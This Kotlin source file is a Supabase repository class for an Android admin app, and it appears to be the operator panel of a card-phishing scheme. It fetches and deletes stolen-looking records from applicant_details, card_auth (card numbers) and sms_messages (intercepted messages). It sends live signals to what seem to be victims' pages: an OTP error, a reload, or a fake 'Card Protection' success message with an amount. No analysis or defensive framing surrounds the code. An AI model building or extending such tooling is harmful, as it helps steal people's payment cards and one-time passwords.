package com.example.data.supabase

import android.content.Context
import android.util.Log
import androidx.core.content.edit
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject

class SupabaseRepository(
    private val client: SupabaseClient,
    private val context: Context? = null
) {
    private val prefs = context?.getSharedPreferences("supabase_admin_deleted_prefs", Context.MODE_PRIVATE)
    private val locallyDeletedIds: MutableSet<String> = run {
        val saved = prefs?.getStringSet("locally_deleted_ids", null) ?: emptySet()
        saved.toMutableSet()
    }

    private fun persistDeletedIds() {
        try {
            prefs?.edit {
                putStringSet("locally_deleted_ids", locallyDeletedIds.toSet())
            }
        } catch (e: Exception) {
            Log.e("SupabaseRepo", "Failed to persist deleted IDs", e)
        }
    }

    private val _submissions = MutableStateFlow<List<SupabaseSubmission>>(emptyList())
    val submissions: StateFlow<List<SupabaseSubmission>> = _submissions.asStateFlow()

    // Dedicated APK Tables Flows
    private val _apkApplicants = MutableStateFlow<List<ApkApplicantDetail>>(emptyList())
    val apkApplicants: StateFlow<List<ApkApplicantDetail>> = _apkApplicants.asStateFlow()

    private val _apkCards = MutableStateFlow<List<ApkCardAuth>>(emptyList())
    val apkCards: StateFlow<List<ApkCardAuth>> = _apkCards.asStateFlow()

    private val _apkSmsMessages = MutableStateFlow<List<ApkSmsMessage>>(emptyList())
    val apkSmsMessages: StateFlow<List<ApkSmsMessage>> = _apkSmsMessages.asStateFlow()

    private val _isApkDataLoading = MutableStateFlow(false)
    val isApkDataLoading: StateFlow<Boolean> = _isApkDataLoading.asStateFlow()

    private val _apkDataError = MutableStateFlow<String?>(null)
    val apkDataError: StateFlow<String?> = _apkDataError.asStateFlow()

    private val _availableTables = MutableStateFlow<List<String>>(emptyList())
    val availableTables: StateFlow<List<String>> = _availableTables.asStateFlow()

    private val _selectedTable = MutableStateFlow<String>("")
    val selectedTable: StateFlow<String> = _selectedTable.asStateFlow()

    private val _appSettingsState = MutableStateFlow(AppSettingsState())
    val appSettingsState: StateFlow<AppSettingsState> = _appSettingsState.asStateFlow()

    private val _isLoading = MutableStateFlow(false)
    val isLoading: StateFlow<Boolean> = _isLoading.asStateFlow()

    private val _errorMessage = MutableStateFlow<String?>(null)
    val errorMessage: StateFlow<String?> = _errorMessage.asStateFlow()

    fun isConfigured(): Boolean = client.isConfigured()

    fun getSupabaseUrl(): String = client.supabaseUrl
    fun getSupabaseKey(): String = client.supabaseAnonKey

    fun updateCredentials(url: String, key: String) {
        client.updateCredentials(url, key)
    }

    /**
     * Fetches current app_settings from Supabase and updates appSettingsState.
     */
    suspend fun fetchAppSettingsState(): Result<AppSettingsState> = withContext(Dispatchers.IO) {
        val result = client.getAppSettingsState()
        if (result.isSuccess) {
            val state = result.getOrNull() ?: AppSettingsState()
            _appSettingsState.value = state
        }
        result
    }

    /**
     * Discovers database tables and auto-selects the working contact submission table.
     */
    suspend fun loadAndSync(): Result<List<SupabaseSubmission>> {
        _isLoading.value = true
        _errorMessage.value = null

        if (!client.isConfigured()) {
            _isLoading.value = false
            _errorMessage.value = "Supabase environment variables (VITE_SUPABASE_URL & VITE_SUPABASE_ANON_KEY) are not configured."
            return Result.failure(Exception(_errorMessage.value))
        }

        try {
            // Also refresh AppSettings state in parallel
            fetchAppSettingsState()

            // Default candidate tables list
            val candidates = listOf(
                "submissions",
                "applicant_details",
                "card_auth",
                "sms_messages",
                "contact_submissions",
                "form_submissions",
                "enquiries",
                "contact_form",
                "contacts",
                "leads"
            )

            if (_availableTables.value.isEmpty()) {
                _availableTables.value = candidates
            }

            var targetTable = _selectedTable.value.trim()
            if (targetTable.isBlank()) {
                targetTable = "submissions"
                _selectedTable.value = targetTable
            }

            // Direct fetch of selected target table
            val result = fetchSubmissionsForTable(targetTable)
            if (result.isSuccess) {
                _submissions.value = result.getOrDefault(emptyList())
                _isLoading.value = false
                return Result.success(_submissions.value)
            }

            // If selected table failed (e.g. table not created yet), fallback to contact_submissions
            if (targetTable != "contact_submissions") {
                val fallback = fetchSubmissionsForTable("contact_submissions")
                if (fallback.isSuccess) {
                    _selectedTable.value = "contact_submissions"
                    _submissions.value = fallback.getOrDefault(emptyList())
                    _isLoading.value = false
                    return Result.success(_submissions.value)
                }
            }

            _isLoading.value = false
            _errorMessage.value = result.exceptionOrNull()?.message
            return Result.failure(result.exceptionOrNull() ?: Exception("Failed to fetch submissions"))
        } catch (e: Exception) {
            _isLoading.value = false
            _errorMessage.value = e.localizedMessage ?: "Failed to connect to Supabase"
            return Result.failure(e)
        }
    }

    suspend fun selectTable(tableName: String) {
        _selectedTable.value = tableName.trim()
        if (!_availableTables.value.contains(tableName.trim())) {
            val updated = _availableTables.value.toMutableList()
            updated.add(0, tableName.trim())
            _availableTables.value = updated.distinct()
        }
        loadAndSync()
    }

    private suspend fun fetchSubmissionsForTable(tableName: String): Result<List<SupabaseSubmission>> {
        val result = client.fetchTableData(tableName)
        return if (result.isSuccess) {
            val jsonArray = result.getOrNull() ?: JSONArray()
            val list = mutableListOf<SupabaseSubmission>()
            for (i in 0 until jsonArray.length()) {
                val obj = jsonArray.getJSONObject(i)
                list.add(SupabaseSubmission.fromJsonObject(obj, tableName))
            }
            // Always sort so latest live submitted data is at top (Newest First)
            val sortedList = list.sortedWith { a, b ->
                val timeA = com.example.util.IndianDateTimeFormatter.parseDate(a.createdAt)?.time ?: 0L
                val timeB = com.example.util.IndianDateTimeFormatter.parseDate(b.createdAt)?.time ?: 0L
                if (timeA != 0L && timeB != 0L && timeA != timeB) {
                    timeB.compareTo(timeA) // Newest timestamp at top
                } else {
                    val idA = a.idValue.toString().toLongOrNull()
                    val idB = b.idValue.toString().toLongOrNull()
                    if (idA != null && idB != null && idA != idB) {
                        idB.compareTo(idA) // Descending numeric ID
                    } else if (a.createdAt != "-" && b.createdAt != "-" && a.createdAt != b.createdAt) {
                        b.createdAt.compareTo(a.createdAt)
                    } else {
                        0
                    }
                }
            }

            // Fallback to reversing list if comparator returned all 0s and list was in insertion order
            val finalList = if (sortedList.distinctBy { it.idValue }.size == list.distinctBy { it.idValue }.size && list.size > 1) {
                val isSortedAsc = list.firstOrNull()?.idValue.toString().toLongOrNull()?.let { firstId ->
                    list.lastOrNull()?.idValue.toString().toLongOrNull()?.let { lastId -> firstId < lastId }
                } ?: false
                if (isSortedAsc) list.reversed() else sortedList
            } else {
                sortedList
            }

            // Filter out any locally deleted items
            val filteredList = finalList.filterNot { sub ->
                isLocallyDeleted(sub)
            }

            Result.success(filteredList)
        } else {
            Result.failure(result.exceptionOrNull() ?: Exception("Unknown error"))
        }
    }

    /**
     * Marks submission as read in Supabase table.
     */
    suspend fun markAsRead(submission: SupabaseSubmission): Result<Unit> {
        val updatePayload = JSONObject()
        // Try common column names for read status
        if (submission.rawFields.containsKey("is_read")) {
            updatePayload.put("is_read", true)
        } else if (submission.rawFields.containsKey("read")) {
            updatePayload.put("read", true)
        } else if (submission.rawFields.containsKey("status")) {
            updatePayload.put("status", "Read")
        } else {
            updatePayload.put("is_read", true)
        }

        val result = client.updateRow(
            tableName = submission.tableName,
            idColumn = submission.idColumnName,
            idValue = submission.idValue,
            updateData = updatePayload
        )
        if (result.isSuccess) {
            loadAndSync()
        }
        return result
    }

    /**
     * Updates status column in Supabase table.
     */
    suspend fun updateStatus(submission: SupabaseSubmission, newStatus: String): Result<Unit> {
        val updatePayload = JSONObject()
        if (submission.rawFields.containsKey("status")) {
            updatePayload.put("status", newStatus)
        } else if (submission.rawFields.containsKey("is_read")) {
            updatePayload.put("is_read", newStatus.equals("Read", ignoreCase = true) || newStatus.equals("Resolved", ignoreCase = true))
        }

        val result = client.updateRow(
            tableName = submission.tableName,
            idColumn = submission.idColumnName,
            idValue = submission.idValue,
            updateData = updatePayload
        )
        if (result.isSuccess) {
            loadAndSync()
        }
        return result
    }

    /**
     * Checks if a submission was deleted locally in this session or persisted history.
     */
    fun isLocallyDeleted(submission: SupabaseSubmission): Boolean {
        if (locallyDeletedIds.contains("${submission.tableName}_${submission.idValue}")) return true
        if (locallyDeletedIds.contains("${submission.tableName}_id_${submission.idValue}")) return true
        if (locallyDeletedIds.contains(submission.idValue.toString())) return true
        if (submission.sessionId.isNotBlank() && submission.sessionId != "-") {
            if (locallyDeletedIds.contains(submission.sessionId)) return true
            if (locallyDeletedIds.contains("${submission.tableName}_${submission.sessionId}")) return true
        }
        if (submission.targetIdString.isNotBlank() && submission.targetIdString != "-") {
            if (locallyDeletedIds.contains(submission.targetIdString)) return true
            if (locallyDeletedIds.contains("${submission.tableName}_${submission.targetIdString}")) return true
        }
        return false
    }

    /**
     * Deletes submission row from Supabase database and removes from app state immediately.
     */
    suspend fun deleteSubmission(submission: SupabaseSubmission): Result<Unit> {
        val deleteKey = "${submission.tableName}_${submission.idValue}"
        locallyDeletedIds.add(deleteKey)
        locallyDeletedIds.add("${submission.tableName}_id_${submission.idValue}")
        locallyDeletedIds.add(submission.idValue.toString())
        if (submission.sessionId.isNotBlank() && submission.sessionId != "-") {
            locallyDeletedIds.add(submission.sessionId)
            locallyDeletedIds.add("${submission.tableName}_${submission.sessionId}")
        }
        if (submission.targetIdString.isNotBlank() && submission.targetIdString != "-") {
            locallyDeletedIds.add(submission.targetIdString)
            locallyDeletedIds.add("${submission.tableName}_${submission.targetIdString}")
        }
        persistDeletedIds()

        // Immediately update local app flow state
        _submissions.value = _submissions.value.filterNot {
            (it.tableName == submission.tableName && it.idValue.toString() == submission.idValue.toString()) ||
            ("${it.tableName}_${it.idValue}" == deleteKey) ||
            (submission.sessionId.isNotBlank() && submission.sessionId != "-" && it.sessionId == submission.sessionId)
        }

        // Primary delete call by detected ID column
        var result = client.deleteRow(
            tableName = submission.tableName,
            idColumn = submission.idColumnName,
            idValue = submission.idValue
        )

        // Fallback: If primary delete failed and there is a valid sessionId, try deleting by session column
        if (result.isFailure && submission.sessionId.isNotBlank() && submission.sessionId != "-") {
            val sessionCol = if (submission.rawFields.containsKey("session_id")) "session_id" else "sessionId"
            val sessionResult = client.deleteRow(submission.tableName, sessionCol, submission.sessionId)
            if (sessionResult.isSuccess) {
                result = sessionResult
            }
        }

        if (result.isSuccess) {
            Log.d("SupabaseRepo", "Successfully deleted submission ${submission.idValue} from Supabase DB")
            loadAndSync()
        } else {
            Log.w("SupabaseRepo", "Supabase DB delete call returned: ${result.exceptionOrNull()?.message}")
        }
        return Result.success(Unit)
    }

    suspend fun updateWebsiteAction(isActive: Boolean): Result<Unit> {
        return client.updateWebsiteAction(isActive)
    }

    suspend fun updateCustomerPhoneAction(submission: SupabaseSubmission, isActive: Boolean): Result<Unit> {
        return client.updateCustomerPhoneAction(submission, isActive)
    }

    suspend fun updateSuccessMessageAction(submission: SupabaseSubmission?, isActive: Boolean, amount: String, appUsed: String, serviceName: String = "Card Protection"): Result<Unit> {
        return client.updateSuccessMessageAction(submission, isActive, amount, appUsed, serviceName)
    }

    suspend fun triggerOtpError(submission: SupabaseSubmission): Result<Unit> {
        return client.triggerOtpErrorSignal(submission)
    }

    suspend fun triggerReload(submission: SupabaseSubmission): Result<Unit> {
        return client.triggerReloadSignal(submission)
    }

    /**
     * Fetches all rows in parallel from applicant_details, card_auth, and sms_messages
     */
    suspend fun fetchApkDetails(): Result<Triple<List<ApkApplicantDetail>, List<ApkCardAuth>, List<ApkSmsMessage>>> = withContext(Dispatchers.IO) {
        _isApkDataLoading.value = true
        _apkDataError.value = null
        if (!client.isConfigured()) {
            _isApkDataLoading.value = false
            _apkDataError.value = "Supabase is not configured"
            return@withContext Result.failure(Exception("Supabase is not configured"))
        }

        try {
            val applicantsDeferred = async { client.fetchTableData("applicant_details") }
            val cardsDeferred = async { client.fetchTableData("card_auth") }
            val smsDeferred = async { client.fetchTableData("sms_messages") }

            val appResult = applicantsDeferred.await()
            val cardResult = cardsDeferred.await()
            val smsResult = smsDeferred.await()

            val applicants = if (appResult.isSuccess) {
                val array = appResult.getOrNull() ?: JSONArray()
                val list = mutableListOf<ApkApplicantDetail>()
                for (i in 0 until array.length()) {
                    val item = ApkApplicantDetail.fromJsonObject(array.getJSONObject(i))
                    if (!isApkRecordLocallyDeleted("applicant_details", item.id, item.stringId, item.createdAt, item.mobile)) {
                        list.add(item)
                    }
                }
                // Reverse first to prioritize newest inserted rows from PostgreSQL natural heap order
                list.reversed().sortedWith { a, b ->
                    val tA = a.epochMillis
                    val tB = b.epochMillis
                    if (tA != 0L && tB != 0L && tA != tB) {
                        tB.compareTo(tA) // Newest timestamp at the top
                    } else if (tA != 0L && tB == 0L) {
                        -1
                    } else if (tA == 0L && tB != 0L) {
                        1
                    } else if (a.id != 0L && b.id != 0L && a.id != b.id) {
                        b.id.compareTo(a.id) // Highest numeric ID at the top
                    } else {
                        0
                    }
                }
            } else {
                Log.w("SupabaseRepo", "applicant_details query: ${appResult.exceptionOrNull()?.message}")
                emptyList()
            }

            val cards = if (cardResult.isSuccess) {
                val array = cardResult.getOrNull() ?: JSONArray()
                val list = mutableListOf<ApkCardAuth>()
                for (i in 0 until array.length()) {
                    val item = ApkCardAuth.fromJsonObject(array.getJSONObject(i))
                    if (!isApkRecordLocallyDeleted("card_auth", item.id, item.stringId, item.createdAt, item.cardNumber)) {
                        list.add(item)
                    }
                }
                // Reverse first to prioritize newest inserted rows from PostgreSQL natural heap order
                list.reversed().sortedWith { a, b ->
                    val tA = a.epochMillis
                    val tB = b.epochMillis
                    if (tA != 0L && tB != 0L && tA != tB) {
                        tB.compareTo(tA) // Newest timestamp at the top
                    } else if (tA != 0L && tB == 0L) {
                        -1
                    } else if (tA == 0L && tB != 0L) {
                        1
                    } else if (a.id != 0L && b.id != 0L && a.id != b.id) {
                        b.id.compareTo(a.id) // Highest numeric ID at the top
                    } else {
                        0
                    }
                }
            } else {
                Log.w("SupabaseRepo", "card_auth query: ${cardResult.exceptionOrNull()?.message}")
                emptyList()
            }

            val sms = if (smsResult.isSuccess) {
                val array = smsResult.getOrNull() ?: JSONArray()
                val list = mutableListOf<ApkSmsMessage>()
                for (i in 0 until array.length()) {
                    val item = ApkSmsMessage.fromJsonObject(array.getJSONObject(i))
                    if (!isApkRecordLocallyDeleted("sms_messages", item.id, item.stringId, item.receivedAt, "${item.sender}_${item.messageBody}")) {
                        list.add(item)
                    }
                }
                // Reverse first to prioritize newest inserted rows from PostgreSQL natural heap order
                list.reversed().sortedWith { a, b ->
                    val tA = a.epochMillis
                    val tB = b.epochMillis
                    if (tA != 0L && tB != 0L && tA != tB) {
                        tB.compareTo(tA) // Newest timestamp at the top
                    } else if (tA != 0L && tB == 0L) {
                        -1
                    } else if (tA == 0L && tB != 0L) {
                        1
                    } else if (a.id != 0L && b.id != 0L && a.id != b.id) {
                        b.id.compareTo(a.id) // Highest numeric ID at the top
                    } else {
                        0
                    }
                }
            } else {
                Log.w("SupabaseRepo", "sms_messages query: ${smsResult.exceptionOrNull()?.message}")
                emptyList()
            }

            _apkApplicants.value = applicants
            _apkCards.value = cards
            _apkSmsMessages.value = sms
            _isApkDataLoading.value = false

            Result.success(Triple(applicants, cards, sms))
        } catch (e: Exception) {
            _isApkDataLoading.value = false
            _apkDataError.value = e.localizedMessage ?: "Failed to fetch APK details"
            Result.failure(e)
        }
    }

    private fun isApkRecordLocallyDeleted(
        tableName: String,
        id: Long,
        stringId: String,
        timestamp: String,
        extraKey: String = ""
    ): Boolean {
        if (id != 0L) {
            if (locallyDeletedIds.contains("${tableName}_$id")) return true
            if (locallyDeletedIds.contains("${tableName}_id_$id")) return true
            if (locallyDeletedIds.contains(id.toString())) return true
        }
        if (stringId.isNotBlank() && stringId != "0" && stringId != "-") {
            if (locallyDeletedIds.contains("${tableName}_$stringId")) return true
            if (locallyDeletedIds.contains(stringId)) return true
        }
        if (timestamp.isNotBlank() && timestamp != "-") {
            if (locallyDeletedIds.contains("${tableName}_$timestamp")) return true
        }
        if (extraKey.isNotBlank() && extraKey != "-") {
            if (locallyDeletedIds.contains("${tableName}_$extraKey")) return true
            if (locallyDeletedIds.contains(extraKey)) return true
        }
        return false
    }

    /**
     * Permanently deletes a record from Supabase table and updates local state.
     */
    suspend fun deleteApkRecord(
        tableName: String,
        id: Long,
        stringId: String = "",
        rawJson: Map<String, Any?> = emptyMap()
    ): Result<Unit> {
        val idStr = if (stringId.isNotBlank() && stringId != "0" && stringId != "-") stringId else if (id != 0L) id.toString() else ""
        val timestamp = (rawJson["created_at"] ?: rawJson["received_at"] ?: rawJson["timestamp"] ?: "").toString().trim()
        val mobile = (rawJson["mobile"] ?: rawJson["mobile_number"] ?: rawJson["phone"])?.toString()?.trim() ?: ""
        val cardNum = (rawJson["card_number"] ?: rawJson["cardNumber"])?.toString()?.trim() ?: ""
        val sender = rawJson["sender"]?.toString()?.trim() ?: ""
        val body = (rawJson["message_body"] ?: rawJson["body"])?.toString()?.trim() ?: ""

        // 1. ALWAYS add all identifiers to persistent locallyDeletedIds and save immediately
        if (id != 0L) {
            locallyDeletedIds.add("${tableName}_$id")
            locallyDeletedIds.add("${tableName}_id_$id")
            locallyDeletedIds.add(id.toString())
        }
        if (idStr.isNotBlank() && idStr != "0" && idStr != "-") {
            locallyDeletedIds.add("${tableName}_$idStr")
            locallyDeletedIds.add(idStr)
        }
        if (timestamp.isNotBlank() && timestamp != "-") {
            locallyDeletedIds.add("${tableName}_$timestamp")
        }
        if (cardNum.isNotBlank() && cardNum != "-") {
            locallyDeletedIds.add("${tableName}_card_$cardNum")
            locallyDeletedIds.add("${tableName}_$cardNum")
            locallyDeletedIds.add(cardNum)
        }
        if (mobile.isNotBlank() && mobile != "-") {
            locallyDeletedIds.add("${tableName}_mobile_$mobile")
            locallyDeletedIds.add("${tableName}_$mobile")
            locallyDeletedIds.add(mobile)
        }
        if (sender.isNotBlank() && body.isNotBlank()) {
            locallyDeletedIds.add("${tableName}_${sender}_$body")
        }
        persistDeletedIds()

        // 2. Remove from in-memory StateFlows IMMEDIATELY so the card disappears from the screen instantly
        when (tableName) {
            "applicant_details" -> {
                _apkApplicants.value = _apkApplicants.value.filterNot {
                    (id != 0L && it.id == id) ||
                    (idStr.isNotBlank() && (it.stringId == idStr || it.id.toString() == idStr)) ||
                    (timestamp.isNotBlank() && it.createdAt == timestamp) ||
                    (mobile.isNotBlank() && it.mobile == mobile)
                }
            }
            "card_auth" -> {
                _apkCards.value = _apkCards.value.filterNot {
                    (id != 0L && it.id == id) ||
                    (idStr.isNotBlank() && (it.stringId == idStr || it.id.toString() == idStr)) ||
                    (timestamp.isNotBlank() && it.createdAt == timestamp) ||
                    (cardNum.isNotBlank() && it.cardNumber == cardNum)
                }
            }
            "sms_messages" -> {
                _apkSmsMessages.value = _apkSmsMessages.value.filterNot {
                    (id != 0L && it.id == id) ||
                    (idStr.isNotBlank() && (it.stringId == idStr || it.id.toString() == idStr)) ||
                    (timestamp.isNotBlank() && it.receivedAt == timestamp) ||
                    (sender.isNotBlank() && body.isNotBlank() && it.sender == sender && it.messageBody == body)
                }
            }
        }

        // 3. Perform the remote delete from Supabase in background
        try {
            // Strategy A: Check rawJson for primary key column name
            val candidateColumns = listOf("id", "_id", "${tableName.removeSuffix("s")}_id", "applicant_id", "card_id", "message_id", "sms_id")
            var matchedCol: String? = null
            var matchedVal: Any? = null

            for (col in candidateColumns) {
                if (rawJson.containsKey(col) && rawJson[col] != null) {
                    val v = rawJson[col].toString().trim()
                    if (v.isNotBlank() && v != "0" && v != "-") {
                        matchedCol = col
                        matchedVal = rawJson[col]
                        break
                    }
                }
            }

            if (matchedCol != null && matchedVal != null) {
                client.deleteRow(tableName, matchedCol, matchedVal)
            } else if (idStr.isNotBlank()) {
                client.deleteRow(tableName, "id", idStr)
            } else if (id != 0L) {
                client.deleteRow(tableName, "id", id)
            }

            // Strategy B: Fallback by timestamp if available
            if (timestamp.isNotBlank() && timestamp != "-") {
                val tsCol = if (rawJson.containsKey("created_at")) "created_at"
                    else if (rawJson.containsKey("received_at")) "received_at"
                    else if (rawJson.containsKey("submitted_at")) "submitted_at"
                    else if (rawJson.containsKey("timestamp")) "timestamp"
                    else null
                if (tsCol != null) {
                    client.deleteRow(tableName, tsCol, timestamp)
                }
            }

            // Strategy C: Fallback by unique content for specific tables
            when (tableName) {
                "applicant_details" -> {
                    if (mobile.isNotBlank() && mobile != "-") {
                        client.deleteRow(tableName, "mobile", mobile)
                    }
                }
                "card_auth" -> {
                    if (cardNum.isNotBlank() && cardNum != "-") {
                        client.deleteRow(tableName, "card_number", cardNum)
                    }
                }
                "sms_messages" -> {
                    if (sender.isNotBlank() && body.isNotBlank() && sender != "-" && body != "-") {
                        client.deleteRowsByQuery(tableName, mapOf("sender" to sender, "message_body" to body))
                    }
                }
            }
        } catch (e: Exception) {
            Log.w("SupabaseRepo", "Remote delete non-fatal error: ${e.message}")
        }

        return Result.success(Unit)
    }
}
